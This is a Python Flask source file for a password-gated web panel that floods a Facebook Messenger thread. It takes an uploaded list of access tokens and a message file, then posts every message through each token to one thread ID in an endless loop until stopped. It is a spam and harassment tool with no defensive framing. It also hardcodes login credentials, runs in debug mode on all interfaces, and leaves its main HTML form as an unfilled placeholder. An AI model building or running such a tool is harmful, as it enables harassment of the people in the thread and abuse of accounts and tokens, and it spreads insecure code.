from flask import Flask, request, session, redirect, url_for, render_template_string
import requests
from threading import Thread, Event
import time

app = Flask(__name__)
app.secret_key = 'your_secret_key_here'  # Use a strong, random key for production
app.debug = True

# ----- Credentials -----
USERNAME = 'MRYUVI'
PASSWORD = 'YUVIXRONI'

# ----- Headers and Events -----
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64)...',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_event = Event()
threads = []

# ----- Messaging Function -----
def send_messages(access_tokens, thread_id, mn, time_interval, messages):
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"Message sent using token {access_token}: {message}")
                else:
                    print(f"Failed to send message using token {access_token}: {message}")
                time.sleep(time_interval)

# ----- Login Page -----
@app.route('/login', methods=['GET', 'POST'])
def login():
    if session.get('logged_in'):
        return redirect(url_for('send_message'))

    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == USERNAME and password == PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('send_message'))
        else:
            return '<h3>Login failed. Invalid credentials.</h3>'

    return '''
        <h2 style="text-align:center;">Secure Login Required</h2>
        <form method="post" style="max-width: 300px; margin: auto;">
            <input type="text" name="username" placeholder="Username" required class="form-control mb-2">
            <input type="password" name="password" placeholder="Password" required class="form-control mb-2">
            <button type="submit" class="btn btn-primary w-100">Login</button>
        </form>
    '''

# ----- Logout -----
@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

# ----- Main Route with Login Protection -----
@app.route('/', methods=['GET', 'POST'])
def send_message():
    if not session.get('logged_in'):
        return redirect(url_for('login'))

    global threads
    if request.method == 'POST':
        token_file = request.files['tokenFile']
        access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        if not any(thread.is_alive() for thread in threads):
            stop_event.clear()
            thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages))            
            thread.start()

    # Your full HTML form goes here — unchanged (you already pasted it above)
    return '''<your_full_existing_HTML_form_code>'''  # Replace with your long HTML string

# ----- Stop Button Handler -----
@app.route('/stop', methods=['POST'])
def stop_sending():
    if not session.get('logged_in'):
        return redirect(url_for('login'))

    stop_event.set()
    return 'Message sending stopped.'

# ----- Run Server -----
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
